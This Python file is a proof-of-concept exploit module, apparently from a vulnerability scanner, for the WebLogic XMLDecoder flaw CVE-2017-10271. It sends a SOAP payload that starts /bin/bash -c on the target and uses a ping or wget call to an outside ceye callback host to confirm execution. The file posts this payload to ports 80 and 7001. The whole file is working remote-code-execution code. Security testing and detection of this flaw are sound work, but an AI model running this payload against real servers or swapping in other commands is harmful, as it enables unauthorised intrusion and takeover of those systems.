import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def poc(url):
    poc_type = 'weblogic:2017-10271'

    if config.method!='ping':    #选择是通过 ping 来确定漏洞还是wget来确定漏洞
        cmd = "{} {}/{}".format(config.method,config.ceye_path,url)
    else:
        cmd = "{} {}.{} -c 4".format(config.method,url,config.ceye_path)

    payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>{}</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>""".format(cmd)
    ports = ['80','7001']
    headers = {'Content-Type': 'text/xml'}

    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)   #对端口进行过滤，如果端口没开就不进行访问

    page_info,ports = page_monitor(url, '/wls-wsat/CoordinatorPortType', poc_type, ports, [200,415])  #对页面进行过滤，如果页面不存在就不进行攻击，判断状态码可以自定义
    port_info.update(page_info)

    for port in ports:
        try:
            # print(cmd)
            s = requests.post(url='http://'+url+':'+port+'/wls-wsat/CoordinatorPortType', data=payload, headers=headers, timeout=config.time_out) #proxies={'http':'http://127.0.0.1:8080'}
            port_info[port] = [1,poc_type,s.status_code]
            # return [1,'requests_len:'+len(s.text),s.status_code]
        except:
            port_info[port] = [0,poc_type,'Conect failed']
            # return [0,'conect_failed']
    return port_info
            

